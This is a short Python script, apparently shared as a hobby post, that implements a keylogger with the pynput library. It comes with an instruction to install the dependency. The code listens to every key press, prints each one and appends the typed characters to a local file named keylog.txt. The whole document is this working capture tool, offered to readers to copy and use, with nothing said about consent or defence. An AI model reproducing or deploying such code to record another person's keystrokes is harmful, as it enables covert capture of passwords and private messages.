# KeyLogger
#Hey, check this key logger that I've created. You can also make one, but first you have to type a command in your CMD "pip install pynput"

from pynput import keyboard

def KeyPressed(key):
      print(str(key))
      with open("keylog.txt", "a") as logkey:
            try:
                  char= key.char
                  logkey.write(char)
            except:
                  print("Error Getting char")

if __name__ == "__main__":
   
        listener = keyboard.Listener(on_press=KeyPressed)
        listener.start()
        input()
